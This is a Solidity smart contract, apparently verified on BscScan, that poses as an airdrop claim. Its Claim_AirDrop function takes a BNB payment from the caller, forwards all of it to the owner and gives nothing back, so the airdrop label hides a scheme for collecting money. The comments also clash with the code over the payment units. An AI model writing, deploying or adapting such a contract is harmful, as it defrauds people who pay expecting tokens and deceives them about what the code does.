/**
 *Submitted for verification at BscScan.com on 2022-02-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract Airdrop {

    uint256 public total_ClaimAirdrop;
    uint256 public cost = 3 * 10 ** 15;  //0.003 bnb
    address public owner;

    mapping(address => uint) public total_claims;
    mapping (uint => address) public _users;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner,"Caller: Must be Owner!!");
        _;
    }

    function Claim_AirDrop(uint256 _amount) public payable {  //0.003 bnb
        uint amount = _amount * 10 ** 18;

        require(msg.value == amount,"Insufficient Amount Passed!!");

        require(msg.value >= cost,"Insufficient Funds!!");
        
        _users[total_ClaimAirdrop] = msg.sender;
        total_claims[msg.sender] += msg.value;
        total_ClaimAirdrop += 1;
        (bool success,) = payable(owner).call{value: msg.value}("");
        require(success,"Transaction Failed!!");

    }

     function Balance() public onlyOwner view returns(uint256){
        return address(this).balance;
    }

    function withdraw() public onlyOwner {
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        require(success,"Transaction Failed!!");
    }

}